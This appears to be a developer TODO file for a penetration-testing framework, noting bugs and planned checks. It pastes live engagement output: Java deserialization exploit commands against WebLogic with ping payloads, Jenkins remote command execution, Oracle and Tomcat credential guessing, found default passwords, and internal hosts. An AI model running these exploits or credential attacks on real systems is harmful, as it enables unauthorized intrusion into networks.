=====
TODO
=====


Docker Environment
==================
* IMPORTANT: RE INSTALL odat !! 


BUG FIXES
===============================================================================

- db > services --up
  File "/root/jok3r/lib/requester/Condition.py", line 125, in __translate_up
    val = (value.lower() == 'true')

- db > service -S -> recherche par url semble pas marcher

- db > services - ip ranges selection bug





IMPROVEMENTS / NEW FEATURES
===============================================================================
- wappalyzer implementation avec versions => based on https://github.com/kanishk619/wappalyzer-python (working)

- Ctrl+C -> add possibility to switch fast mode on/off

- AttackProfiles:
    - weak-creds (weak, common, default)
        http -> changeme, htaccess bruteforce quick with common creds admin:admin, admin:password...
        mssql -> msdat passwordguesser sa:sa sa:
        oracle -> tnscmd pour sid, odat passwordguesser avec sid
        ajp -> ajp bf
        ...

    - advanced-creds-bruteforce
        (include weak-creds checks)

    - fast-scan
    - vuln-lookup-banner (require banner grabbing enabled or banner already retrieved in imported nmap scan)

    - web-scan-appserver
    - web-scan-cms
    - web-discovery
    - web-discovery-fast


- discovery-* checks:
    - appserver-wordlist
    - cms-wordlist
    - language-wordlist (per language => lots of work to produce wordlists for each language + add generic ie HTML, XML, LOG, TXT...)
    - general-minimal-wordlist
    - general-wordlist (raft directory)

- Auth types:
    - supported auth-type => only type that support various status/lvl (can be added in cmdline)
    - can accept other values (eg creds trouvés par changeme) and can be displayed in db>creds
    - method for creds retrieval in postrun

* Reporting HTML:
    * Template https://www.jqueryscript.net/menu/Bootstrap-Sidebar-Extension-With-jQuery-CSS-CSS3.html
    * https://www.jqueryscript.net/demo/Bootstrap-Sidebar-Extension-With-jQuery-CSS-CSS3/
    * http://www.finalhints.com/live-search-in-html-table-using-jquery/
    * At the end, prompt to open in browser like in eyewitness

* Do not re-run checks already done

* Nmap import: filter on nmap results to add






SMART MODULES / REGEXP
===============================================================================
- update regexp version number => ne doit pas finir par un point

- clusterd :
  InsecureRequestWarning)
11-19 03:53PM] Making GET request to https://lons00115973.euro.net.intra:443/console with arguments {'verify': False, 'timeout': 5.0}
[2018-11-19 03:53PM] Checking weblogic version 8.1 WebLogic Admin Console...
[2018-11-19 03:53PM] Making GET request to https://lons00115973.euro.net.intra:443/console with arguments {'verify': False, 'timeout': 5.0}
[2018-11-19 03:53PM] Matched 2 fingerprints for service weblogic
[2018-11-19 03:53PM]    WebLogic Admin Console (version 12)
[2018-11-19 03:53PM]    WebLogic Admin Console (https) (version 12)
[2018-11-19 03:53PM] Fingerprinting completed.
[2018-11-19 03:53PM] Loading auxiliary for 'weblogic'...
[2018-11-19 03:53PM]   Gather WebLogic info (--wl-info)
[2018-11-19 03:53PM]   List deployed apps (--wl-list)
[2018-11-19 03:53PM]   Obtain SMB hash (--wl-smb)
[2018-11-19 03:53PM] Finished at 2018-11-19 03:53PM


- changeme with empty creds:
[16:40:23] Configured protocols: http
[16:40:23] Loading creds into queue
[16:40:23] Jenkins body matched: <title>Dashboard \[Jenkins\]</title>
[16:40:23] Fingerprinting completed
[16:40:23] [+] Found Jenkins default cred : at http://10.243.134.22:8080/
[16:40:23] Scanning Completed
[16:40:24] Found 1 default credentials

Name     Username    Password    Target                      Evidence
-------  ----------  ----------  --------------------------  ----------
Jenkins                          http://10.243.134.22:8080/


- Add product detection in ajp:
        [>] [Recon][Check 02/02] tomcat-version > Fingerprint Tomcat version through AJP
        match auth lvl: True
        match specific: True
        [*] Run command #01

                                                                                                                                                                                                              
        cmd> python2.7 tomcat.py -v --port 8009 version 10.4.16.53                                                                                                                                            

        [2018-11-16 15:14:13.524] DEBUG    Getting resource at ajp13://10.4.16.53:8009/blablablablabla
        Apache Tomcat/7.0.27



- loubia successful :
[>] [Exploit][Check 07/11] weblogic-t3-deserialize-cve2015-4852 > Exploit Java deserialization in Weblogic T3(s) (CVE-2015-4852)
match auth lvl: True
match specific: True
[*] Command #01 is matching current target's context: {'server': ['weblogic']}

[?] Run command #01 ? [Y/n/t/w/q] 


                                                                                                                                                                                                      
cmd> echo "[~] Will try to ping local IP = 10.250.58.108"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; python2.7 loubia.py 10.2.211.136 443 -s -o unix -c '/bin/ping -c 4 10.250.58.108' -v; python2.7 loubia.py 10.2.211.136 443 -s -o win -c 'ping -n 4 10.250.58.108' -v; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap                   

[~] Will try to ping local IP = 10.250.58.108
[~] Running tcpdump in background...
tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
[INFO] Connecting to 10.2.211.136 port 443

[INFO] Sending t3 headers:
t3s 10.3.6
AS:255
HL:19


[INFO] Received t3 handshake response:
HELO:12.1.3.0.false
AS:2048
HL:19
MS:10000000


[INFO] Supplied payload: /bin/ping -c 4 10.250.58.108

[INFO] Final payload 001c2f62696e2f70696e67202d6320342031302e3235302e35382e313038

[INFO] Malicious packet sent

[INFO] Connecting to 10.2.211.136 port 443

[INFO] Sending t3 headers:
t3s 10.3.6
AS:255
HL:19


[INFO] Received t3 handshake response:
HELO:12.1.3.0.false
AS:2048
HL:19
MS:10000000


[INFO] Supplied payload: ping -n 4 10.250.58.108

[INFO] Final payload 001770696e67202d6e20342031302e3235302e35382e313038

[INFO] Target os is win: using "cmd.exe /c"

[INFO] Malicious packet sent

[~] Wait a little bit...
[~] Kill tcpdump
[~] Captured ICMP traffic:

reading from file /tmp/dump.pcap, link-type LINUX_SLL (Linux cooked)
15:54:24.036988 IP lons00115973.uk.net.intra > 10.250.58.108: ICMP echo request, id 1, seq 1, length 40
15:54:24.037023 IP 10.250.58.108 > lons00115973.uk.net.intra: ICMP echo reply, id 1, seq 1, length 40
15:54:25.038770 IP lons00115973.uk.net.intra > 10.250.58.108: ICMP echo request, id 1, seq 2, length 40
15:54:25.038825 IP 10.250.58.108 > lons00115973.uk.net.intra: ICMP echo reply, id 1, seq 2, length 40
15:54:26.040031 IP lons00115973.uk.net.intra > 10.250.58.108: ICMP echo request, id 1, seq 3, length 40
15:54:26.040071 IP 10.250.58.108 > lons00115973.uk.net.intra: ICMP echo reply, id 1, seq 3, length 40
[~] Delete capture


- example banners:
- 767 | 10.6.4.23      | 1521 | tcp   | oracle  | product: Oracle TNS listener version: 12.2.0.1.0 extrainfo: |     |         | 0      |       |
|       |                |      |       |         | unauthorized                                                |     |         |        |       |
| 18912 | 10.6.32.121    | 1521 | tcp   | oracle  | product: Oracle TNS listener version: 12.2.0.1.0 extrainfo: |     |         | 0      |       |
|       |                |      |       |         | unauthorized                                                |     |         |        |       |
| 19732 | 10.243.136.130 | 1521 | tcp   | oracle  | product: Oracle TNS listener version: 11.2.0.2.0 extrainfo: |     |         | 0      |       |
|       |                |      |       |         | unauthorized      

-  21503 | 10.190.10.32   | 443  | tcp   | http    | product: Apache Tomcat version: 8.5.8                 | https://10.190.10.32:443   |         | 0      |       |
| 21519 | 10.190.10.41   | 443  | tcp   | http    | product: Apache Tomcat/Coyote JSP engine version: 1.1 | https://10.190.10.41:443   |         | 0      |       |
| 21521 | 10.190.10.42   | 443  | tcp   | http    | product: Apache Tomcat/Coyote JSP engine version: 1.1 



- smartmodule -> webdav
    _http-iis-webdav-vuln: WebDAV is DISABLED


- MS17-010 not detected: ==> ) -> \) + LIKELY
  
        if re.search('Microsoft Windows system vulnerable to remote code execution \(MS08-067\)\s*(\r\n|\r|\n)\|\s*State: (LIKELY )?VULNERABLE', 
                     cmd_output, re.IGNORECASE):
            r.add_option('vuln-ms08-067', 'true')

        if re.search('Remote Code Execution vulnerability in Microsoft SMBv1 servers \(ms17-010\)\s*(\r\n|\r|\n)\|\s*State: (LIKELY )?VULNERABLE',
                     cmd_output, re.IGNORECASE):
            r.add_option('vuln-ms17-010', 'true')

        if re.search('SAMBA Remote Code Execution from Writable Share\s*(\r\n|\r|\n)\|\s*State: (LIKELY )?VULNERABLE', cmd_output, re.IGNORECASE):
            r.add_option('vuln-sambacry', 'true')



* angularjs -> boolean (angularjs can be used with php,asp...)
*  smartmodule -> webdav
    _http-iis-webdav-vuln: WebDAV is DISABLED

* - ftp patator update smart:
14:04:27 patator    INFO - 502   29     0.006 | anonymous:                         |     1 | PASS command not implemented.
14:04:39 patator    INFO - 421   53     0.008 | anonymous:                         |     1 | Too many users logged in, closing control connection 

* - ftp update smart, add anonymous creds when nmap detect + context req sur bruteforce:
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack HP JetDirect ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_d-w--w--w-   2 JetDirect  public         512 Feb 14  1999 PORT1 [NSE: writeable]

* - add postrun tnscmd_sid
- add re.IGNORECASE tns sid
- add sid detection:
[+] Data received by the database server: ''\x00 \x00\x00\x02\x00\x00\x00\x016\x00\x01\x08\x00\x7f\xff\x00\x01\x01]\x00 \r\x08\x00\x00\x00\x00\x00\x00\x00\x00\x01g\x00\x00\x06\x00\x00\x00\x00\x00(DESCRIPTION=(TMP=)(VSNNUM=153093632)(ERR=0)(ALIAS=LISTENER)(SECURITY=OFF)(VERSION=TNSLSNR for IBM/AIX RISC System/6000: Version 9.2.0.6.0 - Production)(START_DATE=10-NOV-2018 17:56:38)(SIDNUM=1)(LOGFILE=/apps/oracle/9.2.0/network/log/listener.log)(PRMFILE=/apps/oracle/adm/network/listener.ora)(TRACING=off)(UPTIME=23928489)(SNMP=OFF)(PID=7995588))\x02Q\x00\x00\x06\x00\x00\x00\x00\x00(ENDPOINT=(HANDLER=(HANDLER_MAXLOAD=0)(HANDLER_LOAD=0)(ESTABLISHED=0)(REFUSED=0)(HANDLER_ID=7A5359F37007-00C4-E053-9F32E94200C4)(PRE=any)(SESSION=NS)(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=parva7301586)(PORT=1521))))),,(SERVICE=(SERVICE_NAME=METHFRP1_DGMGRL.world)(INSTANCE=(INSTANCE_NAME=METHFRP1)(NUM=1)(INSTANCE_STATUS=UNKNOWN)(NUMREL=1))),,(SERVICE=(SERVICE_NAME=ROG2WDP0_DGMGRL.world)(INSTANCE=(INSTANCE_NAME=ROG2WDP0)(NUM=1)(INSTANCE_STATUS=UNKNOWN)(NUMREL=1))),,(SERVICE=(SERVICE_NAME=RSS0WDP1)(INSTANCE=(INSTANCE_NAME=RSS0WDP1)(NUM=1)(INSTANCE_STATUS=UNKNOWN)(NUMREL=1))),,''

- Check this case where sid=LISTENER ??

         cmd> python2.7 odat.py tnscmd -s 10.190.98.154 -p 1521 -d any --ping -v                                                                                                                               

        16:49:05 INFO -: alias list emptied
        16:49:05 INFO -: Data received thanks to the 'ping' cmd: '\x00A\x00\x00\x04\x00\x00\x00"\x00\x005(DESCRIPTION=(TMP=)(VSNNUM=0)(ERR=0)(ALIAS=LISTENER))'

        [1] (10.190.98.154:1521): Searching ALIAS on the 10.190.98.154 server, port 1521
        [+] 1 ALIAS received: ['LISTENER']. You should use this alias (more or less) as Oracle SID.

                                                                                                                                                                                                              


        [*] [SMART] Running post-check method "tnscmd_sid" ...
        [+] [SMART] New detected option: sid = LISTENER

        [?] Run command #02 ? [Y/n/t/w/q] q




- add postrun tnscmd_sid
- add re.IGNORECASE tns sid
- add sid detection:
[+] Data received by the database server: ''\x00 \x00\x00\x02\x00\x00\x00\x016\x00\x01\x08\x00\x7f\xff\x00\x01\x01]\x00 \r\x08\x00\x00\x00\x00\x00\x00\x00\x00\x01g\x00\x00\x06\x00\x00\x00\x00\x00(DESCRIPTION=(TMP=)(VSNNUM=153093632)(ERR=0)(ALIAS=LISTENER)(SECURITY=OFF)(VERSION=TNSLSNR for IBM/AIX RISC System/6000: Version 9.2.0.6.0 - Production)(START_DATE=10-NOV-2018 17:56:38)(SIDNUM=1)(LOGFILE=/apps/oracle/9.2.0/network/log/listener.log)(PRMFILE=/apps/oracle/adm/network/listener.ora)(TRACING=off)(UPTIME=23928489)(SNMP=OFF)(PID=7995588))\x02Q\x00\x00\x06\x00\x00\x00\x00\x00(ENDPOINT=(HANDLER=(HANDLER_MAXLOAD=0)(HANDLER_LOAD=0)(ESTABLISHED=0)(REFUSED=0)(HANDLER_ID=7A5359F37007-00C4-E053-9F32E94200C4)(PRE=any)(SESSION=NS)(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=parva7301586)(PORT=1521))))),,(SERVICE=(SERVICE_NAME=METHFRP1_DGMGRL.world)(INSTANCE=(INSTANCE_NAME=METHFRP1)(NUM=1)(INSTANCE_STATUS=UNKNOWN)(NUMREL=1))),,(SERVICE=(SERVICE_NAME=ROG2WDP0_DGMGRL.world)(INSTANCE=(INSTANCE_NAME=ROG2WDP0)(NUM=1)(INSTANCE_STATUS=UNKNOWN)(NUMREL=1))),,(SERVICE=(SERVICE_NAME=RSS0WDP1)(INSTANCE=(INSTANCE_NAME=RSS0WDP1)(NUM=1)(INSTANCE_STATUS=UNKNOWN)(NUMREL=1))),,''

- Check this case where sid=LISTENER ??

         cmd> python2.7 odat.py tnscmd -s 10.190.98.154 -p 1521 -d any --ping -v                                                                                                                               

        16:49:05 INFO -: alias list emptied
        16:49:05 INFO -: Data received thanks to the 'ping' cmd: '\x00A\x00\x00\x04\x00\x00\x00"\x00\x005(DESCRIPTION=(TMP=)(VSNNUM=0)(ERR=0)(ALIAS=LISTENER))'

        [1] (10.190.98.154:1521): Searching ALIAS on the 10.190.98.154 server, port 1521
        [+] 1 ALIAS received: ['LISTENER']. You should use this alias (more or less) as Oracle SID.

                                                                                                                                                                                                              


        [*] [SMART] Running post-check method "tnscmd_sid" ...
        [+] [SMART] New detected option: sid = LISTENER

        [?] Run command #02 ? [Y/n/t/w/q] q



- ftp patator update smart:
14:04:27 patator    INFO - 502   29     0.006 | anonymous:                         |     1 | PASS command not implemented.
14:04:39 patator    INFO - 421   53     0.008 | anonymous:                         |     1 | Too many users logged in, closing control connection 

- ftp update smart, add anonymous creds when nmap detect + context req sur bruteforce:
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack HP JetDirect ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_d-w--w--w-   2 JetDirect  public         512 Feb 14  1999 PORT1 [NSE: writeable]



- changeme (ATTENTION, possibilite empty creds : ":"):

    
Loaded 113 default credential profiles
Loaded 324 default credentials

[13:37:15] Configured protocols: http
[13:37:15] Loading creds into queue
[13:37:18] Dell iDRAC body matched: <title>Integrated Dell Remote Access Controller
[13:37:18] Fingerprinting completed
[13:37:20] [+] Found Dell iDRAC default cred root:calvin at https://10.253.27.106:443/data/login
[13:37:20] Scanning Completed


[13:37:20] Found 1 default credentials

Name        Username    Password    Target                                Evidence
----------  ----------  ----------  ------------------------------------  ----------
Dell iDRAC  root        calvin      https://10.253.27.106:443/data/login




-----


[14:58:26] Invalid Apache Tomcat Host Manager default cred admin:tomcat at http://10.4.16.198:8080/host-manager/html
[14:58:26] Invalid Apache Tomcat Host Manager default cred root:root at http://10.4.16.198:8080/host-manager/html
[14:58:26] Invalid Apache Tomcat Host Manager default cred role1:role1 at http://10.4.16.198:8080/host-manager/html
[14:58:26] Invalid Apache Tomcat Host Manager default cred tomcat:changethis at http://10.4.16.198:8080/host-manager/html
[14:58:26] Invalid Apache Tomcat Host Manager default cred role:changethis at http://10.4.16.198:8080/host-manager/html
[14:58:26] Invalid Apache Tomcat Host Manager default cred admin:j5Brn9 at http://10.4.16.198:8080/host-manager/html
[14:58:26] [+] Found Apache Tomcat Host Manager default cred QCC:QLogic66 at http://10.4.16.198:8080/host-manager/html
[14:58:26] [+] Found Apache Tomcat default cred QCC:QLogic66 at http://10.4.16.198:8080/manager/html
[14:58:27] Invalid Apache Tomcat Host Manager default cred role1:tomcat at http://10.4.16.198:8080/host-manager/html
[14:58:27] Scanning Completed


[14:58:27] Found 2 default credentials

Name                        Username    Password    Target                                     Evidence
--------------------------  ----------  ----------  -----------------------------------------  ----------
Apache Tomcat Host Manager  QCC         QLogic66    http://10.4.16.198:8080/host-manager/html
Apache Tomcat               QCC         QLogic66    http://10.4.16.198:8080/manager/html








CHECKS CORRECTIONS
===============================================================================


- samba-rce-cve2015-0240 only if os = *linux*

- Correct path ysoserial:
/jok3r/toolbox/http/exploit-weblogic-cve2017-3248# python2.7 exploits/weblogic/exploit-CVE-2017-3248-bobsecq.py -t 10.2.211.136 -p 443 --ssl --check --ysopath /root/jok3r/toolbox/multi/ysoserial/ysoserial-master.jar


- Mettre /bin/bash -c pour utilisation de <<< + single quote !! dans :
root@kali:~/jok3r/toolbox/http/exploit-weblogic-cve2018-2893# echo "[~] Will try to ping local IP = 10.250.58.108"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -jar ysoserial-cve-2018-2893.jar JRMPClient4 "/bin/ping -c 4 10.250.58.108" > /tmp/poc4.ser; python2.7 weblogic.py 10.2.211.136 443 /tmp/poc4.ser; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap; rm /tmp/poc4.ser

-ODAT: simple quote après /bin/bash !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! (sinon $var non prise en compte)
/bin/bash -c 'export ORACLE_HOME=`file /usr/lib/oracle/*/client64/ | tail -n 1 | cut -d":" -f1`; export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib; export PATH=$ORACLE_HOME/bin:$PATH; echo $ORACLE_HOME; python2.7 odat.py passwordguesser -s 10.2.208.173 -p 1521 -d LISTENER -vv --force-retry --accounts-file accounts/accounts_multiple.txt'


- dirsearch : -t 40 --timeout=

- angularjs -> boolean (angularjs can be used with php,asp...)


- tool ajpy=> add option --old-version + list applications

- ajp settings: change dir wordlists
tool        = ajpy
command_1   = python2.7 tomcat.py -v --port [PORT] bf -U [WORDLISTSDIR]/services/http/creds/app-servers/tomcat-usernames.txt -P [WORDLISTSDIR]/services/http/creds/app-servers/tomcat-passwords.txt
postrun     = ajpy_valid_creds

- add --timeout to dirsearch

- odat add -v : python2.7 odat.py tnscmd -s 10.14.17.218 -p 1575 -d any --ping -v

- Replace patator by hydra (more mature, easier to parse outputs, better output)

- DOMI-OWNED  => fonctionne sur 5, 6 et v8

- bug dirhunt
    cmd> dirhunt https://www.correspondant-assurance.fr/bnppere                                                                                                                                           

    Traceback (most recent call last):
      File "/usr/local/bin/dirhunt", line 11, in <module>
        load_entry_point('dirhunt==0.5.1', 'console_scripts', 'dirhunt')()
      File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 484, in load_entry_point
        return get_distribution(dist).load_entry_point(group, name)
      File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 2707, in load_entry_point
        return ep.load()
      File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 2325, in load
        return self.resolve()
      File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 2331, in resolve
        module = __import__(self.module_name, fromlist=['__name__'], level=0)
      File "/usr/local/lib/python3.6/dist-packages/dirhunt-0.5.1-py3.6.egg/dirhunt/management.py", line 13, in <module>
        from dirhunt.crawler import Crawler
      File "/usr/local/lib/python3.6/dist-packages/dirhunt-0.5.1-py3.6.egg/dirhunt/crawler.py", line 16, in <module>
        from dirhunt.sessions import Sessions
      File "/usr/local/lib/python3.6/dist-packages/dirhunt-0.5.1-py3.6.egg/dirhunt/sessions.py", line 5, in <module>
        from proxy_db.models import Proxy
    ModuleNotFoundError: No module named 'proxy_db.models'


- ./optionsbleed -n 40 -a -u https://www.correspondant-epargne.fr/tpe 
No response , Normal ?

- add exploitations avec clusterd

- [check_mysql-interesting-tables-columns] add context


* odat add -v : python2.7 odat.py tnscmd -s 10.14.17.218 -p 1575 -d any --ping -v

- Add option --webdir-wordlist for check discovery-general-wordlist 




CHECKS ADDING
===============================================================================
- https://github.com/SecWiki/CMS-Hunter
- Add Hydra

- Jenkins scripts:
Attention; TARGETURI / et /jenkins/

msf auxiliary(scanner/http/jenkins_command) > show options 

Module options (auxiliary/scanner/http/jenkins_command):


msf auxiliary(scanner/http/jenkins_command) > run

[+] [2018.11.19-14:37:28] 10.2.153.123:8080     nt authority\system
[*] [2018.11.19-14:37:28] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/jenkins_command) > 
msf auxiliary(scanner/http/jenkins_command) > 
msf auxiliary(scanner/http/jenkins_command) > set TARGETURI /jenkins/
TARGETURI => /jenkins/
msf auxiliary(scanner/http/jenkins_command) > run

[-] [2018.11.19-14:37:51] 10.2.153.123:8080     This system is not running Jenkins-CI at /jenkins/
[*] [2018.11.19-14:37:51] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/jenkins_command) > set TARGETURI /
TARGETURI => /

- Jenkins deserialize

- add exploit/linux/misc/jenkins_java_deserialize (attention: os linux)
- add exploit/windows/misc/ibm_websphere_java_deserialize (os win)
- add auxiliary/scanner/http/jenkins_login
- add exploit/windows/misc/ibm_websphere_java_deserialize
- add https://github.com/Coalfire-Research/java-deserialization-exploits (websphere rce, jenkins rce...)
- add exploit/multi/http/jenkins_script_console
- add msfmodules for different appservers.....
- RCE Tomcat CVE-2017-12617 /usr/share/exploitdb/exploits/jsp/webapps/42966.py
    WARNING: Add verify=False !
            if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
                print bcolors.WARNING+url+' it\'s Vulnerable to CVE-2017-12617'+bcolors.ENDC
                print bcolors.WARNING+url+"/"+checker+bcolors.ENDC
                
        else:
            print 'Not Vulnerable to CVE-2017-12617 '


- add bruteforce htaccess hydra if 401 unauthorized returned in headers
hydra -l admin -P ~/github/jok3r/wordlists/passwords/pass_medium.txt -e ns -t 10 -f -s -v -V 10.190.136.194  http-get /
> GET / HTTP/1.1
> Host: 10.190.136.194
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 401 Unauthorized
< Content-Type: text/html
< Server: Microsoft-IIS/8.0
< WWW-Authenticate: Negotiate
< WWW-Authenticate: NTLM
< X-Powered-By: ASP.NET
< Date: Fri, 23 Nov 2018 10:15:48 GMT
< Content-Length: 1293


- Sharepoint -> https://github.com/TestingPens/SPartan

- check ms17-010 exploit multi platform

- add ssh cve enum
- add ssh libssh vuln

- ftp postexploit list dir

* Weblogic CVE-2018-2628 https://github.com/tdy218/ysoserial-cve-2018-2628
* https://github.com/chadillac/mdns_recon
* nfsshell (sudo apt-get install libreadline-dev ; make)
* https://github.com/hegusung/RPCScan.git
* https://www.magereport.com
* https://github.com/AlisamTechnology/PRESTA-modules-shell-exploit/blob/master/PRESTA-shell-exploit.pl
* https://github.com/breenmachine/JavaUnserializeExploits
* https://github.com/DanMcInerney/pentest-machine

* Better exploit for MS17-010 (support for more win versions, only Win7 and 2008 R2 for now)

* For all bruteforce with 'auth_status': NO_AUTH -> create command with username known 

* cve jquery
* cve ssh
* vulners-lookup
* cvedetails-lookup
* wordlists per language
* jndiat
* check https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html
* correct start module http 


* Java-RMI -> handle case windows ping -n


- Sharepoint -> https://github.com/TestingPens/SPartan

- tool ajpy=> add option --old-version + list applications

* Improve wordlist quality:
    * passwords
    * wordlist per language
    * wordlist per cms
    * wordlist per server
    * web files/directories:
        * https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
        * https://github.com/xajkep/wordlists
        * https://www.netsparker.com/blog/web-security/svn-digger-better-lists-for-forced-browsing/
        * Administration: https://github.com/fnk0c/cangibrina/tree/master/wordlists



WORDLISTS ADDING
===============================================================================

- Idea for wordlist services creds: https://github.com/x90skysn3k/brutespray/tree/master/wordlist

- Very Minimalist dirs wordlists

root@kali:~/jok3r/toolbox/http/dirsearch# cat dirs_minimalist.txt 
account
accounts
adm
admin
_admin
Admin
ADMIN
admin2
adminarea
administrator
api
app
appli
application
applis
auth
back
backup
_backup
bak
cache
_cache
common
component
components
conf
config
configuration
control
controller
controllers
core
data
debug
dev
development
doc
docs
document
download
downloads
Downloads
en
error
file
files
Files
fr
ftp
help
html
image
images
img
inc
Inc
include
_include
includes
_includes
Includes
install
lib
manager
modules
old
page
pages
pdf
phpmyadmin
plugins
priv
_priv
_private
pub
public
_public
report
reports
require
script
scripts
secure
service
services
share
site
sites
sql
src
stat
stats
status
temp
Temp
template
templates
test
Test
test1
test2
testing
tests
tmp
tool
tools
tpl
update
updates
upload
uploads
Uploads
user
users
util
utils
webadmin
WEB-INF
www
xml
xmlrpc












- jok3r-script for oracle install:

  - change url + reinstall
  wget https://github.com/koutto/jok3r-scripts/raw/master/oracle/odat-dependencies/oracle-instantclient12.2-sqlplus_12.2.0.1.0-2_amd64.deb
wget https://github.com/koutto/jok3r-scripts/raw/master/oracle/odat-dependencies/oracle-instantclient18.3-basic_18.3.0.0.0-2_amd64.deb
wget https://github.com/koutto/jok3r-scripts/raw/master/oracle/odat-dependencies/oracle-instantclient18.3-devel_18.3.0.0.0-2_amd64.deb
sudo dpkg -i oracle-instantclient18.3-basic_18.3.0.0.0-2_amd64.deb
sudo dpkg -i oracle-instantclient12.2-sqlplus_12.2.0.1.0-2_amd64.deb

- add in dockerfile:

  export ORACLE_HOME=`file /usr/lib/oracle/*/client64/ | tail -n 1 | cut -d':' -f1`
  export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
  export PATH=$ORACLE_HOME/bin:$PATH
  
 - autre bug:
17:17:05 DEBUG -: Try to connect with APPLYSYSPUB/<UNKNOWN>
17:17:05 DEBUG -: Oracle connection string: APPLYSYSPUB/<UNKNOWN>@10.190.98.115:1521/LISTENER
17:17:05 DEBUG -: Error during connection with this account: `ORA-12514: TNS:listener does not currently know of service requested in connect descriptor`
17:17:05 DEBUG -: Try to connect with APPS/APPS
17:17:05 DEBUG -: Oracle connection string: APPS/APPS@10.190.98.115:1521/LISTENER
=> correction:
/bin/bash -c "export ORACLE_HOME=`file /usr/lib/oracle/*/client64/ | tail -n 1 | cut -d':' -f1`; export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib; export PATH=$ORACLE_HOME/bin:$PATH; python2.7 odat.py passwordguesser -s 10.190.98.114 -p 1521 -d SCAN3 -vv --force-retry --accounts-file accounts/accounts_multiple.txt"


- More default creds for mssql
https://github.com/mubix/post-exploitation-wiki/blob/master/windows/mssql.md












- smartmodule method changeme:

Loaded 113 default credential profiles
Loaded 324 default credentials

[10:57:26] Configured protocols: http
[10:57:26] Loading creds into queue
[10:57:26] Apache Tomcat basic auth matched: Tomcat Manager Application
[10:57:26] Apache Tomcat Host Manager basic auth matched: Tomcat Host Manager Application
[10:57:26] Fingerprinting completed
[10:57:26] Invalid Apache Tomcat default cred tomcat:tomcat at http://10.250.87.209:8080/manager/html
[10:57:26] Invalid Apache Tomcat default cred tomcat:tomcat at http://10.250.87.209:8080/tomcat/manager/html
[10:57:26] Invalid Apache Tomcat default cred admin:admin at http://10.250.87.209:8080/tomcat/manager/html
[10:57:26] Invalid Apache Tomcat default cred admin:admin at http://10.250.87.209:8080/manager/html
[10:57:26] Invalid Apache Tomcat default cred ovwebusr:OvW*busr1 at http://10.250.87.209:8080/manager/html
[10:57:26] Invalid Apache Tomcat default cred ovwebusr:OvW*busr1 at http://10.250.87.209:8080/tomcat/manager/html
[10:57:26] Invalid Apache Tomcat default cred j2deployer:j2deployer at http://10.250.87.209:8080/tomcat/manager/html
[10:57:26] Invalid Apache Tomcat default cred cxsdk:kdsxc at http://10.250.87.209:8080/manager/html
[10:57:26] Invalid Apache Tomcat default cred ADMIN:ADMIN at http://10.250.87.209:8080/tomcat/manager/html
[10:57:26] Invalid Apache Tomcat default cred xampp:xampp at http://10.250.87.209:8080/manager/html
[10:57:26] Invalid Apache Tomcat default cred cxsdk:kdsxc at http://10.250.87.209:8080/tomcat/manager/html
[10:57:26] Invalid Apache Tomcat default cred xampp:xampp at http://10.250.87.209:8080/tomcat/manager/html
[10:57:27] Invalid Apache Tomcat default cred QCC:QLogic66 at http://10.250.87.209:8080/manager/html
[10:57:27] Invalid Apache Tomcat default cred QCC:QLogic66 at http://10.250.87.209:8080/tomcat/manager/html
[10:57:27] Invalid Apache Tomcat default cred tomcat:s3cret at http://10.250.87.209:8080/tomcat/manager/html
[10:57:27] Invalid Apache Tomcat default cred admin:None at http://10.250.87.209:8080/tomcat/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred tomcat:tomcat at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred ovwebusr:OvW*busr1 at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat default cred root:root at http://10.250.87.209:8080/tomcat/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred cxsdk:kdsxc at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat default cred role1:role1 at http://10.250.87.209:8080/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred ADMIN:ADMIN at http://10.250.87.209:8080/host-manager/html
[10:57:27] Invalid Apache Tomcat default cred role1:role1 at http://10.250.87.209:8080/tomcat/manager/html
[10:57:27] Invalid Apache Tomcat Host Manager default cred xampp:xampp at http://10.250.87.209:8080/host-manager/html
